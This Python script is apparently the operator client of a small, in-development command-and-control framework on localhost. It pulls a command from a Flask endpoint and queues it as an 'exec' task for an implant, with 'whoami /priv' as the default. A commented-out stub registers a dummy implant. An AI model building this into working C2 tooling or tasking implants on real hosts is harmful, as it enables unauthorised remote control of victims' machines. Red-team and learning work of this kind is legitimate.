from urllib.parse  import urljoin 
#from implant_pb2 import *
from client_pb2 import Command
import requests

c2 = "http://127.0.0.1:5000"


task_list = "/task/list"
task_create = "task/create"
register = "/register"

def create_dummy_task(implant_id=1, opcode="exec", args="whoami /priv"):
    r = requests.get(urljoin(c2, "/get_command"))
    if r.status_code == 200:
        command = Command()
        command.ParseFromString(r.content)
        if command.cmd:
            print(f"Received command: {command.cmd}")
            # Create task using the received command
            task_data = {
                "implant_id": implant_id,
                "opcode": opcode,
                "args": command.cmd  # Using command.cmd as the task command
            }
            response = requests.post(urljoin(c2, task_create), json=task_data)
            if response.status_code == 200:
                print("Task created successfully!")
                return True
            else:
                print("Failed to create task.")
    else:
        print("No command received from the Flask app.")
    return False


'''
def create_dummy_implant():
    r = RegisterImplant()
    r.Password = "foobar"
    r.Username = "lol"
    r.Hostname = "Ghost"
    r.GUID = "xxxxxxxxxxxx"
    out = r.SerializeToString()
    r = requests.post(urljoin( c2, register), data = out)
'''
if __name__ == '__main__':
    create_dummy_task()